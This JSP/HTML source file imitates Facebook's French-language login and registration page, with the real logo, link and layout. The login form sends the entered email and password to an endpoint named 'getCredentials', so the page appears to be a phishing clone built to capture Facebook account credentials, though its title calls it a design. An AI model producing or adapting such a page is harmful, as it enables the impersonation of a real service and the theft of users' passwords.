<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<%@ taglib uri="http://java.sun.com/jsp/jstl/core"   prefix="c"   %>
<%@ page session="false"  %>
<title>Facebook Style Home Page Design</title>
<!-- <link rel="stylesheet" href="jsp/face.css" type="text/css" />  -->
<style type="text/css">
    <%@include file="face.css" %>
    </style>
</head>
<body class="login">
<!-- header starts here -->
<div id="facebook-Bar">
  <div id="facebook-Frame">
    <div id="logo"> <a href="http://facebook.com">facebook</a> </div>
    <div id="header-main-right">
      <div id="header-main-right-nav">
        <form method="post" action="getCredentials" id="login_form" name="login_form">
          <table border="0" style="border:none">
            <tr>
              <td ><input type="text" tabindex="1"  id="email" placeholder="Adresse e-mail ou mobile" name="email" class="inputtext radius1" value=""></td>
              <td ><input type="password" tabindex="2" id="pass" placeholder="Mot de passe" name="pass" class="inputtext radius1" ></td>
              <td ><input type="submit" class="fbbutton" name="login" value="Connexion" /></td>
            </tr>
            <tr>
              <td><label>
                  <input id="persist_box" type="checkbox" name="persistent" value="1" checked="1"/>
                  <span style="color:#ccc;">Garder ma session active</span></label></td>
              <td><label><a href="" style="color:#ccc; text-decoration:none">Mot de passe oubli&#233 ?</a></label></td>
            </tr>
          </table>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- header ends here -->
<div class="loginbox radius">
  <h2 style="color:#141823; text-align:right;">Inscription</h2>
  <div class="loginboxinner radius">
    <div class="loginheader">
      <h4 class="title">C&#39est gratuit (et ça le restera toujours)</h4>
    </div>
    <img src="http://www.newzilla.net/wp-content/uploads/2011/02/Facebookalten.jpg" align="left">
    <!--loginheader-->
    <div class="loginform">
      <form id="login" action="" method="post">
        <p>
          <input type="text" id="firstname" name="firstname" placeholder="Pr&#233nom" value="" class="radius mini" />
          <input type="text" id="lastname" name="lastname" placeholder="Nom de famille" value="" class="radius mini" />
        </p>
        <p>
          <input type="text" id="email" name="email" placeholder="Adresse e-mail ou mobile" value="" class="radius" />
        </p>
        <p>
          <input type="text" id="remail" name="remail" placeholder="Confirmer l'adresse email ou mobile" class="radius" />
        </p>
        <p>
          <input type="password" id="password" name="password" placeholder="Nouveau mot de passe" class="radius" />
        </p>
        <p>
          <button class="radius titleButton" name="signup">Inscription</button>
        </p>
      </form>
    </div>
    <!--loginform-->
  </div>
  <!--loginboxinner-->
</div>
<!--loginbox-->
</body>
</html>